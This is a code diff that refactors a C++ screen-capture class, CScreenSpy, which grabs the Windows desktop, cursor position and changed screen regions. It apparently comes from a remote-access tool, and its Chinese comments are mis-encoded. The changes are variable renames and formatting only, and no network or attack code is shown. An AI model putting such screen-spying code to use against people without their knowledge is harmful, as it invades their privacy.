@@ -1,6 +1,3 @@
-// ScreenSpy.cpp: implementation of the CScreenSpy class.
-//
-//////////////////////////////////////////////////////////////////////
 #include "ScreenSpy.h"
 #include "until.h"
 
@@ -8,26 +5,24 @@
 
 #define DEF_STEP	19
 #define OFF_SET		24
-//////////////////////////////////////////////////////////////////////
-// Construction/Destruction
-//////////////////////////////////////////////////////////////////////
 
 #ifdef _CONSOLE
 #include <stdio.h>
 #endif
-CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
+
+CScreenSpy::CScreenSpy(int nbiBitCount, bool bIsGray, UINT nMaxFrameRate)
 {
-	switch (biBitCount)
+	switch (nbiBitCount)
 	{
 	case 1:
 	case 4:
 	case 8:
 	case 16:
 	case 32:
-		m_biBitCount = biBitCount;
+		m_nbiBitCount = nbiBitCount;
 		break;
 	default:
-		m_biBitCount = 8;
+		m_nbiBitCount = 8;
 	}
 	
 	if (!SelectInputWinStation())
@@ -38,14 +33,14 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 
 	m_dwBitBltRop	= SRCCOPY;
 
-	m_bAlgorithm	= ALGORITHM_SCAN; // Ä¬ÈÏÊ¹ÓÃ¸ôÐÐÉ¨ÃèËã·¨
+	m_byAlgorithm	= ALGORITHM_SCAN; // Ä¬ÈÏÊ¹ÓÃ¸ôÐÐÉ¨ÃèËã·¨
 	m_dwLastCapture	= GetTickCount();
 	m_nMaxFrameRate	= nMaxFrameRate;
 	m_dwSleep		= 1000 / nMaxFrameRate;
 	m_bIsGray		= bIsGray;
     m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
     m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
-    m_nIncSize		= 32 / m_biBitCount;
+    m_nIncSize		= 32 / m_nbiBitCount;
 
 	m_nStartLine	= 0;
 
@@ -56,9 +51,9 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 	m_lpvLineBits	= NULL;
 	m_lpvFullBits	= NULL;
 
-	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
-	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
-	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
+	m_lpbmi_line	= ConstructBI(m_nbiBitCount, m_nFullWidth, 1);
+	m_lpbmi_full	= ConstructBI(m_nbiBitCount, m_nFullWidth, m_nFullHeight);
+	m_lpbmi_rect	= ConstructBI(m_nbiBitCount, m_nFullWidth, 1);
 
 	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
 	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);
@@ -80,6 +75,7 @@ CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
 CScreenSpy::~CScreenSpy()
 {
 	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
+
 	::DeleteDC(m_hLineMemDC);
 	::DeleteDC(m_hFullMemDC);
 	::DeleteDC(m_hRectMemDC);
@@ -90,10 +86,13 @@ CScreenSpy::~CScreenSpy()
 	::DeleteObject(m_hDiffBitmap);
 
 	if (m_rectBuffer)
+	{
 		delete[] m_rectBuffer;
-	delete[]	m_lpbmi_full;
-	delete[]	m_lpbmi_line;
-	delete[]	m_lpbmi_rect;
+	}
+
+	delete[] m_lpbmi_full;
+	delete[] m_lpbmi_line;
+	delete[] m_lpbmi_rect;
 }
 
 
@@ -109,7 +108,7 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	m_rectBufferOffset = 0;
 
 	// Ð´ÈëÊ¹ÓÃÁËÄÄÖÖËã·¨
-	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));
+	WriteRectBuffer((LPBYTE)&m_byAlgorithm, sizeof(m_byAlgorithm));
 
 	// Ð´Èë¹â±êÎ»ÖÃ
 	POINT	CursorPos;
@@ -121,7 +120,7 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));
 
 	// ²îÒì±È½ÏËã·¨
-	if (m_bAlgorithm == ALGORITHM_DIFF)
+	if (m_byAlgorithm == ALGORITHM_DIFF)
 	{
 		// ·Ö¶ÎÉ¨ÃèÈ«ÆÁÄ»
 		ScanScreen(m_hDiffMemDC, m_hFullDC, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
@@ -196,7 +195,7 @@ bool CScreenSpy::ScanChangedRect(int nStartLine)
 }
 void CScreenSpy::setAlgorithm(UINT nAlgorithm)
 {
-	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
+	InterlockedExchange((LPLONG)&m_byAlgorithm, nAlgorithm);
 }
 
 LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
@@ -205,27 +204,30 @@ LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
 biBitCount Îª1 (ºÚ°×¶þÉ«Í¼) ¡¢4 (16 É«Í¼) ¡¢8 (256 É«Í¼) Ê±ÓÉÑÕÉ«±íÏîÊýÖ¸³öÑÕÉ«±í´óÐ¡
 biBitCount Îª16 (16 Î»É«Í¼) ¡¢24 (Õæ²ÊÉ«Í¼, ²»Ö§³Ö) ¡¢32 (32 Î»É«Í¼) Ê±Ã»ÓÐÑÕÉ«±í
 	*/
-	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
+	int	nColorNum = biBitCount <= 8 ? 1 << biBitCount : 0;
 	
-	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
-	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
+	int nBISize = sizeof(BITMAPINFOHEADER) + (nColorNum * sizeof(RGBQUAD));
+	BITMAPINFO	*lpbmi = (BITMAPINFO *)new(std::nothrow) BYTE[nBISize];
 	
-	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
-	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
-	lpbmih->biWidth = biWidth;
-	lpbmih->biHeight = biHeight;
-	lpbmih->biPlanes = 1;
-	lpbmih->biBitCount = biBitCount;
-	lpbmih->biCompression = BI_RGB;
-	lpbmih->biXPelsPerMeter = 0;
-	lpbmih->biYPelsPerMeter = 0;
-	lpbmih->biClrUsed = 0;
-	lpbmih->biClrImportant = 0;
-	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
-	
+	BITMAPINFOHEADER *lpbmih = &(lpbmi->bmiHeader);
+	lpbmih->biSize			 = sizeof(BITMAPINFOHEADER);
+	lpbmih->biWidth			 = biWidth;
+	lpbmih->biHeight		 = biHeight;
+	lpbmih->biPlanes		 = 1;
+	lpbmih->biBitCount		 = biBitCount;
+	lpbmih->biCompression	 = BI_RGB;
+	lpbmih->biXPelsPerMeter  = 0;
+	lpbmih->biYPelsPerMeter  = 0;
+	lpbmih->biClrUsed		 = 0;
+	lpbmih->biClrImportant   = 0;
+	lpbmih->biSizeImage		 = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
+
 	// 16Î»ºÍÒÔºóµÄÃ»ÓÐÑÕÉ«±í£¬Ö±½Ó·µ»Ø
 	if (biBitCount >= 16)
+	{
 		return lpbmi;
+	}
+
 	/*
 	Windows 95ºÍWindows 98£ºÈç¹ûlpvBits²ÎÊýÎªNULL²¢ÇÒGetDIBits³É¹¦µØÌî³äÁËBITMAPINFO½á¹¹£¬ÄÇÃ´·µ»ØÖµÎªÎ»Í¼ÖÐ×Ü¹²µÄÉ¨ÃèÏßÊý¡£
 	
@@ -235,12 +237,13 @@ biBitCount Îª16 (16 Î»É«Í¼) ¡¢24 (Õæ²ÊÉ«Í¼, ²»Ö§³Ö) ¡¢32 (32 Î»É«Í¼) Ê±Ã»ÓÐÑÕÉ«±
 	HDC	hDC = GetDC(NULL);
 	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // ¸ß¿í²»ÄÜÎª0
 	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
+
 	ReleaseDC(NULL, hDC);
 	DeleteObject(hBmp);
 
 	if (m_bIsGray)
 	{
-		for (int i = 0; i < color_num; i++)
+		for (int i = 0; i < nColorNum; i++)
 		{
 			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
 			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
@@ -309,7 +312,7 @@ LPBITMAPINFO CScreenSpy::getBI()
 
 UINT CScreenSpy::getBISize()
 {
-	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
+	int	color_num = m_nbiBitCount <= 8 ? 1 << m_nbiBitCount : 0;
 	
 	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
 }
